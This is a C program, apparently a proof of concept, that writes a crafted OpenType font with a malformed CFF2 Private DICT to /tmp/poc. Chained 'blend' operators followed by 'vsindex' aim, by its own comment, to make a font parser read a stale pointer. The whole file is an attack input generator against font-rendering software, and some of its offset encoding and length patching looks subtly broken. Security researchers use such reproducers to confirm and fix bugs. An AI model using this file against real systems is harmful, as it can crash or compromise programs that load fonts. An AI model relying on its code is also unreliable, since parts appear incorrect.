#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /* Write SFNT header and table records first */
    uint32_t sfDirSize = 12 + 9 * 16;
    uint32_t off = sfDirSize;

    uint32_t head_off = off; off += 54;
    uint32_t hhea_off = off; off += 36;
    uint32_t hmtx_off = off; off += 4;
    uint32_t maxp_off = off; off += 6;
    uint32_t os2_off = off; off += 78;
    uint32_t name_off = off; off += 18;
    uint32_t post_off = off; off += 32;
    uint32_t cmap_off = off; off += 24;
    uint32_t cff2_off = off;

    write_uint32(f, 0x4F54544F);
    write_uint16(f, 9);
    write_uint16(f, 16);
    write_uint16(f, 4);
    write_uint16(f, (uint16_t)(9 * 16 - 16));

    write_uint32(f, 0x68656164); write_uint32(f, 0); write_uint32(f, head_off); write_uint32(f, 54);
    write_uint32(f, 0x68686561); write_uint32(f, 0); write_uint32(f, hhea_off); write_uint32(f, 36);
    write_uint32(f, 0x686D7478); write_uint32(f, 0); write_uint32(f, hmtx_off); write_uint32(f, 4);
    write_uint32(f, 0x6D617870); write_uint32(f, 0); write_uint32(f, maxp_off); write_uint32(f, 6);
    write_uint32(f, 0x4F532F32); write_uint32(f, 0); write_uint32(f, os2_off); write_uint32(f, 78);
    write_uint32(f, 0x6E616D65); write_uint32(f, 0); write_uint32(f, name_off); write_uint32(f, 18);
    write_uint32(f, 0x706F7374); write_uint32(f, 0); write_uint32(f, post_off); write_uint32(f, 32);
    write_uint32(f, 0x636D6170); write_uint32(f, 0); write_uint32(f, cmap_off); write_uint32(f, 24);
    write_uint32(f, 0x43464632); write_uint32(f, 0); write_uint32(f, cff2_off); write_uint32(f, 0); /* placeholder */

    /* Write SFNT table data */
    uint8_t head_data[54], hhea_data[36], hmtx_data[4], maxp_data[6];
    uint8_t os2_data[78], name_data[18], post_data[32], cmap_data[24];

    memset(head_data, 0, sizeof(head_data));
    head_data[0] = 0x00; head_data[1] = 0x01;
    head_data[12] = 0x5F; head_data[13] = 0x0F; head_data[14] = 0x3C; head_data[15] = 0xF5;
    head_data[18] = 0x03; head_data[19] = 0xE8;
    head_data[50] = 0x00;

    memset(hhea_data, 0, sizeof(hhea_data));
    hhea_data[0] = 0x00; hhea_data[1] = 0x01;
    hhea_data[34] = 0x00; hhea_data[35] = 0x01;

    memset(hmtx_data, 0, sizeof(hmtx_data));
    hmtx_data[0] = 0x01; hmtx_data[1] = 0xF4;

    memset(maxp_data, 0, sizeof(maxp_data));
    maxp_data[0] = 0x00; maxp_data[1] = 0x01;
    maxp_data[4] = 0x00; maxp_data[5] = 0x01;

    memset(os2_data, 0, sizeof(os2_data));
    os2_data[0] = 0x00; os2_data[1] = 0x04;
    os2_data[4] = 0x01; os2_data[5] = 0x90;
    os2_data[6] = 0x00; os2_data[7] = 0x05;
    os2_data[66] = 0x03; os2_data[67] = 0x20;
    os2_data[68] = 0xFF; os2_data[69] = 0x38;
    os2_data[72] = 0x03; os2_data[73] = 0xE8;
    os2_data[74] = 0x00; os2_data[75] = 0xC8;

    memset(name_data, 0, sizeof(name_data));
    name_data[2] = 0x00; name_data[3] = 0x01;
    name_data[4] = 0x00; name_data[5] = 0x0C;
    name_data[6] = 0x00; name_data[7] = 0x01;

    memset(post_data, 0, sizeof(post_data));
    post_data[0] = 0x00; post_data[1] = 0x03;
    post_data[8] = 0xFF; post_data[9] = 0x9C;
    post_data[10] = 0x00; post_data[11] = 0x32;

    memset(cmap_data, 0, sizeof(cmap_data));
    cmap_data[2] = 0x00; cmap_data[3] = 0x01;
    cmap_data[4] = 0x00; cmap_data[5] = 0x03;
    cmap_data[6] = 0x00; cmap_data[7] = 0x01;
    cmap_data[8] = 0x00; cmap_data[9] = 0x00;
    cmap_data[10] = 0x00; cmap_data[11] = 0x0C;
    cmap_data[12] = 0x00; cmap_data[13] = 0x04;
    cmap_data[14] = 0x00; cmap_data[15] = 0x1A;
    cmap_data[16] = 0x00; cmap_data[17] = 0x00;
    cmap_data[18] = 0x00; cmap_data[19] = 0x02;
    cmap_data[20] = 0x00; cmap_data[21] = 0x01;

    fwrite(head_data, 1, 54, f);
    fwrite(hhea_data, 1, 36, f);
    fwrite(hmtx_data, 1, 4, f);
    fwrite(maxp_data, 1, 6, f);
    fwrite(os2_data, 1, 78, f);
    fwrite(name_data, 1, 18, f);
    fwrite(post_data, 1, 32, f);
    fwrite(cmap_data, 1, 24, f);

    /* Now write CFF2 data using ftell() for all offsets */
    uint32_t cff_start = ftell(f);

    /* CFF2 Header: 5 bytes + topDictLength (2 bytes) */
    fputc(0x02, f); /* major */
    fputc(0x00, f); /* minor */
    fputc(0x05, f); /* hdrSize */
    fputc(0x00, f); /* placeholder for topDictLength high */
    fputc(0x00, f); /* placeholder for topDictLength low */

    uint32_t top_dict_len_pos = ftell(f) - 2;

    /* Top DICT data */
    uint32_t top_dict_start = ftell(f);

    /* CharStrings: push offset, opcode 0x11 */
    uint32_t charstrings_pos = ftell(f);
    fputc(0x8B, f); /* push 0 placeholder */
    fputc(0x11, f); /* CharStrings */

    /* FDArray: push offset, opcode 0x1C */
    uint32_t fdarray_pos = ftell(f);
    fputc(0x8B, f); /* push 0 placeholder */
    fputc(0x1C, f); /* FDArray */

    fputc(0x0F, f); /* end Top DICT */

    uint32_t top_dict_end = ftell(f);
    uint32_t top_dict_size = top_dict_end - top_dict_start;

    /* Patch topDictLength */
    fseek(f, top_dict_len_pos, SEEK_SET);
    write_uint16(f, top_dict_size);
    fseek(f, top_dict_end, SEEK_SET);

    /* Global Subr INDEX (empty, 32-bit count) */
    write_uint32(f, 0);

    /* Font DICT INDEX (32-bit count = 1) */
    uint32_t fdarray_start = ftell(f);
    write_uint32(f, 1); /* count */
    fputc(0x01, f);     /* offSize = 1 */
    fputc(0x01, f);     /* offset[0] = 1 */

    /* Font DICT data */
    uint32_t font_dict_start = ftell(f);
    /* Private operator: push size, push offset, opcode 0x12 */
    uint32_t private_size_pos = ftell(f);
    fputc(0x8B, f); /* push 0 placeholder for size */
    uint32_t private_offset_pos = ftell(f);
    fputc(0x8B, f); /* push 0 placeholder for offset */
    fputc(0x12, f); /* Private */
    fputc(0x0F, f); /* end Font DICT */

    uint32_t font_dict_end = ftell(f);
    uint32_t font_dict_size = font_dict_end - font_dict_start;

    /* Patch Font DICT INDEX offset[1] */
    fseek(f, fdarray_start + 5, SEEK_SET);
    fputc((font_dict_size + 1), f);
    fseek(f, font_dict_end, SEEK_SET);

    /* Private DICT data */
    uint32_t private_dict_start = ftell(f);

    fputc(0x8B, f); /* vsindex: push 0 */
    fputc(0x16, f); /* vsindex */
    fputc(0x8C, f); /* maxstack: push 1 */
    fputc(0x19, f); /* maxstack */

    /* First blend: 4 operands + numBlends=2 */
    fputc(0x8B, f); fputc(0x8B, f);
    fputc(0x8B, f); fputc(0x8B, f);
    fputc(0x8D, f); /* push 2 */
    fputc(0x17, f); /* blend */

    /* Second blend: 2 operands + numBlends=1 */
    fputc(0x8B, f); fputc(0x8B, f);
    fputc(0x8C, f); /* push 1 */
    fputc(0x17, f); /* blend */

    /* vsindex to read stale pointer */
    fputc(0x16, f); /* vsindex */

    fputc(0x0F, f); /* end Private DICT */

    uint32_t private_dict_end = ftell(f);
    uint32_t private_dict_size = private_dict_end - private_dict_start;

    /* Patch Font DICT private placeholders */
    fseek(f, private_size_pos, SEEK_SET);
    fputc(private_dict_size + 139, f);
    fputc(private_dict_start + 139, f);
    fseek(f, private_dict_end, SEEK_SET);

    /* FDSelect (format 0) */
    uint32_t fdselect_start = ftell(f);
    fputc(0x00, f); /* format 0 */
    fputc(0x00, f); /* glyph 0 -> FD index 0 */

    /* CharStrings INDEX (32-bit count = 1) */
    uint32_t charstrings_start = ftell(f);
    write_uint32(f, 1); /* count */
    fputc(0x01, f);     /* offSize = 1 */
    fputc(0x01, f);     /* offset[0] = 1 */
    fputc(0x02, f);     /* offset[1] = 2 */
    fputc(0x0E, f);     /* endchar */

    /* Patch Top DICT placeholders */
    fseek(f, charstrings_pos, SEEK_SET);
    fputc(charstrings_start + 139, f);
    fseek(f, fdarray_pos, SEEK_SET);
    fputc(fdarray_start + 139, f);

    /* Update CFF2 table length */
    uint32_t cff_end = ftell(f);
    uint32_t cff_size = cff_end - cff_start;

    fseek(f, cff2_off + 8, SEEK_SET);
    write_uint32(f, cff_size);

    fclose(f);
    return 0;
}